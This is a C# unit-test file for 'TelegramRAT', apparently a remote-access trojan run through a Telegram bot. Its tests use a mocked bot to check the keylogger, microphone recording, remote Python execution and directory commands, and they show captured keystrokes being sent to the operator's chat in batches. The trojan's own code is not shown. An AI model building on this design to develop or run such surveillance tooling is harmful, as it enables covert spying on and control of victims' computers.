using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Moq;
using NAudio.Wave;
using Telegram.Bot;
using Telegram.Bot.Requests;
using Telegram.Bot.Requests.Abstractions;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using TelegramRAT;
using TelegramRAT.Commands;
using Xunit;

namespace TelegramRAT.Tests;

public class CommandRegistryTests
{
    private static Mock<ITelegramBotClient> CreateBotMock(List<string> sentMessages)
    {
        var botMock = new Mock<ITelegramBotClient>(MockBehavior.Strict);

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<Message>>(), It.IsAny<CancellationToken>()))
            .Returns<IRequest<Message>, CancellationToken>((request, _) =>
            {
                switch (request)
                {
                    case SendMessageRequest messageRequest:
                        sentMessages.Add(messageRequest.Text);
                        return Task.FromResult(new Message
                        {
                            MessageId = 1,
                            Chat = new Chat { Id = messageRequest.ChatId.Identifier ?? 0 }
                        });
                    case SendDocumentRequest:
                    case SendVoiceRequest:
                        return Task.FromResult(new Message { MessageId = 1 });
                    default:
                        return Task.FromResult(new Message { MessageId = 1 });
                }
            });

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<bool>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(true);

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<File>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new File { FileId = "file", FilePath = "UserScript.py" });

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<Stream>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(Stream.Null);

        return botMock;
    }

    private static BotCommandModel CreateModel(string command, string[]? args = null)
        => new()
        {
            Command = command,
            Args = args ?? Array.Empty<string>(),
            RawArgs = args == null ? string.Empty : string.Join(' ', args),
            Message = new Message
            {
                Chat = new Chat { Id = 123 },
                From = new User { Id = 321, FirstName = "tester" },
                MessageId = 7,
                Date = DateTime.UtcNow
            }
        };

    [Fact]
    public async Task KeylogCommand_WhenAlreadyActive_TogglesOffWithoutRequests()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "keylog");

        var keylogField = typeof(CommandRegistry).GetField("KeylogActive", BindingFlags.NonPublic | BindingFlags.Static);
        keylogField!.SetValue(null, true);

        var model = CreateModel("keylog");

        await command.Execute(model);

        Assert.False((bool)keylogField.GetValue(null)!);
        Assert.Empty(sentMessages);
        botMock.VerifyNoOtherCalls();
    }

    [Fact]
    public async Task AudioCommand_RespondsImmediatelyWhenUnableToRecord()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "audio");

        var model = CreateModel("audio", new[] { "invalid" });

        await command.Execute(model);

        Assert.Single(sentMessages);
        var expectedMessage = WaveInEvent.DeviceCount == 0
            ? "This machine has no audio input devices, the recording isn't possible."
            : "Argument must be a positive integer!";
        Assert.Equal(expectedMessage, sentMessages[0]);
    }

    [Fact]
    public async Task PythonCommand_WithNoArguments_PromptsForInput()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "py");

        var model = CreateModel("py");

        await command.Execute(model);

        Assert.Single(sentMessages);
        Assert.Equal("Need an expression or file to execute", sentMessages[0]);
    }

    [Fact]
    public async Task CdCommand_WithQuotedPathChangesDirectory()
    {
        var sentMessages = new List<string>();
        var botMock = CreateBotMock(sentMessages);
        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "cd");

        var originalDirectory = Directory.GetCurrentDirectory();
        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
        var targetDirectory = Path.Combine(tempRoot, "Program Files");
        Directory.CreateDirectory(targetDirectory);

        try
        {
            var model = new BotCommandModel
            {
                Command = "cd",
                Args = new[] { targetDirectory },
                RawArgs = $"\"{targetDirectory}\"",
                Message = new Message
                {
                    Chat = new Chat { Id = 123 },
                    From = new User { Id = 321, FirstName = "tester" },
                    MessageId = 7,
                    Date = DateTime.UtcNow
                }
            };

            await command.Execute(model);

            var expectedDirectory = Path.GetFullPath(targetDirectory);
            var actualDirectory = Directory.GetCurrentDirectory();
            var comparison = RuntimeInformation.IsOSPlatform(OSPlatform.Windows)
                ? StringComparison.OrdinalIgnoreCase
                : StringComparison.Ordinal;

            Assert.True(string.Equals(expectedDirectory, actualDirectory, comparison));
            Assert.Single(sentMessages);
            Assert.Contains(expectedDirectory, sentMessages[0]);
        }
        finally
        {
            Directory.SetCurrentDirectory(originalDirectory);

            if (Directory.Exists(tempRoot))
                Directory.Delete(tempRoot, recursive: true);
        }
    }

    [Fact]
    public async Task KeylogCommand_StreamsBatchesAndTrimsSnippet()
    {
        var sentMessages = new List<string>();
        string? capturedDocument = null;

        var botMock = new Mock<ITelegramBotClient>(MockBehavior.Strict);

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<Message>>(), It.IsAny<CancellationToken>()))
            .Returns<IRequest<Message>, CancellationToken>((request, _) =>
            {
                switch (request)
                {
                    case SendMessageRequest messageRequest:
                        sentMessages.Add(messageRequest.Text);
                        return Task.FromResult(new Message
                        {
                            MessageId = 1,
                            Chat = new Chat { Id = messageRequest.ChatId.Identifier ?? 0 }
                        });
                    case SendDocumentRequest documentRequest:
                    {
                        if (documentRequest.Document is InputFileStream inputFileStream)
                        {
                            if (inputFileStream.Content.CanSeek)
                                inputFileStream.Content.Position = 0;
                            using var reader = new StreamReader(inputFileStream.Content, leaveOpen: true);
                            capturedDocument = reader.ReadToEnd();
                            if (inputFileStream.Content.CanSeek)
                                inputFileStream.Content.Position = 0;
                        }

                        return Task.FromResult(new Message { MessageId = 1 });
                    }
                    default:
                        return Task.FromResult(new Message { MessageId = 1 });
                }
            });

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<bool>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(true);

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<File>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new File { FileId = "file", FilePath = "UserScript.py" });

        botMock
            .Setup(b => b.MakeRequest(It.IsAny<IRequest<Stream>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(Stream.Null);

        Program.SetBotClient(botMock.Object);

        var commands = new List<BotCommand>();
        CommandRegistry.InitializeCommands(commands);
        var command = commands.Single(c => c.Command == "keylog");

        var keylogField = typeof(CommandRegistry).GetField("KeylogActive", BindingFlags.NonPublic | BindingFlags.Static);
        keylogField!.SetValue(null, false);

        var providerField = typeof(CommandRegistry).GetField("KeylogKeyProvider", BindingFlags.NonPublic | BindingFlags.Static);
        var mapperField = typeof(CommandRegistry).GetField("KeylogKeyMapper", BindingFlags.NonPublic | BindingFlags.Static);

        var originalProvider = (Func<List<uint>>)providerField!.GetValue(null)!;
        var originalMapper = (Func<uint, char>)mapperField!.GetValue(null)!;

        try
        {
            var sequences = new Queue<List<uint>>();
            for (int i = 0; i < 8; i++)
            {
                sequences.Enqueue(Enumerable.Repeat(65u, 600).ToList());
                sequences.Enqueue(new List<uint>());
            }

            providerField.SetValue(null, new Func<List<uint>>(() =>
            {
                if (sequences.Count == 0)
                {
                    return new List<uint>();
                }

                return sequences.Dequeue();
            }));

            mapperField.SetValue(null, new Func<uint, char>(_ => 'A'));

            var model = CreateModel("keylog");

            var executeTask = command.Execute(model);

            await Task.Delay(1000);
            keylogField.SetValue(null, false);

            await executeTask;

            var snippetMessage = sentMessages.Last(message => message.StartsWith("Keylog from "));
            var snippet = snippetMessage.Substring(snippetMessage.LastIndexOf('\n') + 1);

            Assert.True(snippet.Length <= 1024);
            Assert.True(snippet.Length >= 900);

            Assert.False(string.IsNullOrEmpty(capturedDocument));
            Assert.Contains("Mapped:", capturedDocument);
            Assert.Contains("Unmapped:", capturedDocument);
        }
        finally
        {
            providerField.SetValue(null, originalProvider);
            mapperField.SetValue(null, originalMapper);
            keylogField.SetValue(null, false);
        }
    }
}
